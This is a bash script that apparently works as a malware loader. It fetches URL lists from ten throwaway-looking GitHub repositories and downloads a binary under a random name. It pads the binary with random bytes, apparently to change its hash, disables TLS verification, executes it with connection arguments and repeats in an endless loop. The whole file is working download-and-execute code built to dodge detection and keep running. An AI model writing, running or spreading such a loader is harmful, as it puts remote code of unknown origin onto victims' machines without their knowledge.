#!/bin/bash
CONNECT=${1:-2}
NAME=${2:-BapBo}
CUSTOM=${3:-}
DIR="$(cd "$(dirname "$0")" && pwd)"

LIST_URLS=(
"https://raw.githubusercontent.com/77151violetpetek/raw-list-diuf73q0/refs/heads/main/list.txt"
"https://raw.githubusercontent.com/andrlemarinda4sf44076/raw-list-10pgesmj/refs/heads/main/list.txt"
"https://raw.githubusercontent.com/ballantine11815keith/raw-list-gnfw20zu/refs/heads/main/list.txt"
"https://raw.githubusercontent.com/graycemaninrkd7/raw-list-5k19q83w/refs/heads/main/list.txt"
"https://raw.githubusercontent.com/17870takishagalfayan/raw-list-uka8km30/refs/heads/main/list.txt"
"https://raw.githubusercontent.com/jesusrowlette291/raw-list-ag3vt6cb/refs/heads/main/list.txt"
"https://raw.githubusercontent.com/marandahelderman57751/raw-list-27f58tjb/refs/heads/main/list.txt"
"https://raw.githubusercontent.com/gudaitistheodoraq09uc95897/raw-list-xo7qe6f7/refs/heads/main/list.txt"
"https://raw.githubusercontent.com/heathp8pottebaum/raw-list-aa110ipl/refs/heads/main/list.txt"
"https://raw.githubusercontent.com/preza76338inell/raw-list-1iqff02n/refs/heads/main/list.txt"
)

load_random_url_list() {
    local shuffled_list=($(shuf -e $(seq 0 $((${#LIST_URLS[@]} - 1)))))
    for idx in "${shuffled_list[@]}"; do
        local list_url="${LIST_URLS[$idx]}"
        local raw_urls=()
        while IFS= read -r line; do
            [[ -n "$line" && ! "$line" =~ ^[[:space:]]*# ]] && raw_urls+=("$line")
        done < <(curl -sL "$list_url" 2>&1)
        if [ ${#raw_urls[@]} -gt 0 ]; then
            URLS=($(shuf -e "${raw_urls[@]}"))
            return 0
        fi
    done
    return 1
}

download_binary() {
    local bin_path="$1"
    local shuffled_indices=($(shuf -e $(seq 0 $((${#URLS[@]} - 1)))))
    for idx in "${shuffled_indices[@]}"; do
        local url="${URLS[$idx]}"
        curl -sL -o "$bin_path" "$url" 2>&1
        if [ -s "$bin_path" ]; then
            return 0
        else
            rm -f "$bin_path"
        fi
    done
    return 1
}

while true; do
    if ! load_random_url_list; then
        sleep 10
        continue
    fi
    RAND="$(tr -dc 'a-z0-9' </dev/urandom | head -c 10)"
    BIN="${DIR}/${RAND}"
    if ! download_binary "$BIN"; then
        if load_random_url_list; then
            if ! download_binary "$BIN"; then
                rm -f "$BIN"
                sleep 5
                continue
            fi
        else
            sleep 5
            continue
        fi
    fi
    tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c $((100000 + RANDOM % 6666666)) >> "$BIN" || true
    chmod +x "$BIN"
    export NODE_TLS_REJECT_UNAUTHORIZED=0
	"$BIN" "$CONNECT" "$NAME" &
    BIN_PID=$!
    wait $BIN_PID
    rm -f "$BIN"
    sleep 5
done